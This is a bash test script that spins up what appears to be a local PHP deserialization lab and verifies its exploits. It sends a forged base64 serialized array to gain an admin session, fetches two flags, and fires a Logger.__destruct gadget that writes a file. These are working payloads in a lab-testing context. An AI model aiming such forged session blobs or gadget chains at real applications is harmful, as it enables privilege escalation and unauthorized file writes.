#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
sleep 4

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

until nc -z -w2 127.0.0.1 8092 2>/dev/null; do sleep 1; done

CJAR=$(mktemp /tmp/cookies-XXXXXX.txt)

# Test 1: legitimate login and session save/restore
OUT=$(curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8092/login \
    -H "Content-Type: application/json" \
    -d '{"username":"alice","password":"alice123"}' 2>/dev/null)
check "alice login succeeds" "$( echo "$OUT" | grep -q 'alice' && echo 1 || echo 0 )"

SAVE_RESP=$(curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8092/session/save \
    -H "Content-Type: application/json" \
    -d '{}' 2>/dev/null)
BLOB=$(echo "$SAVE_RESP" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('session_blob',''))" 2>/dev/null || echo "")
check "session save returns blob" "$( [ -n \"$BLOB\" ] && echo 1 || echo 0 )"

# Test 2: forge admin session via PHP serialized array
rm -f "$CJAR"; CJAR=$(mktemp /tmp/cookies-XXXXXX.txt)
ADMIN_BLOB=$(python3 -c "
import base64
s = 'a:2:{s:4:\"user\";s:5:\"admin\";s:4:\"role\";s:5:\"admin\";}'
print(base64.b64encode(s.encode()).decode())
")
OUT=$(curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8092/session/restore \
    -H "Content-Type: application/json" \
    -d "{\"session_blob\":\"$ADMIN_BLOB\"}" 2>/dev/null)
check "forged PHP array restores admin role" "$( echo "$OUT" | grep -q 'admin' && echo 1 || echo 0 )"

# Test 3: flag1 from /profile hint
OUT=$(curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8092/profile 2>/dev/null)
FLAG1=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "admin profile returns flag1" "$( [ -n "$FLAG1" ] && echo 1 || echo 0 )"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"

# Test 4: flag2 from /admin/secret
OUT=$(curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8092/admin/secret 2>/dev/null)
FLAG2=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "admin/secret returns flag2" "$( [ -n "$FLAG2" ] && echo 1 || echo 0 )"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"

# Test 5: Logger.__destruct gadget writes file
LOGGER_BLOB=$(python3 -c "
import base64
s = 'O:6:\"Logger\":2:{s:7:\"logfile\";s:19:\"/tmp/gadget_out.txt\";s:7:\"message\";s:6:\"HACKED\";}'
print(base64.b64encode(s.encode()).decode())
")
curl -s \
    -X POST http://127.0.0.1:8092/session/restore \
    -H "Content-Type: application/json" \
    -d "{\"session_blob\":\"$LOGGER_BLOB\"}" > /dev/null 2>&1
sleep 1
CONTAINER=$(docker ps --filter "name=php-deserialization" --format "{{.Names}}" | head -1)
GADGET_OUT=$(docker exec "$CONTAINER" cat /tmp/gadget_out.txt 2>/dev/null || echo "")
check "Logger.__destruct gadget wrote file" "$( echo "$GADGET_OUT" | grep -q 'HACKED' && echo 1 || echo 0 )"
[ -n "$GADGET_OUT" ] && echo "    gadget output: $GADGET_OUT"

rm -f "$CJAR"
$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
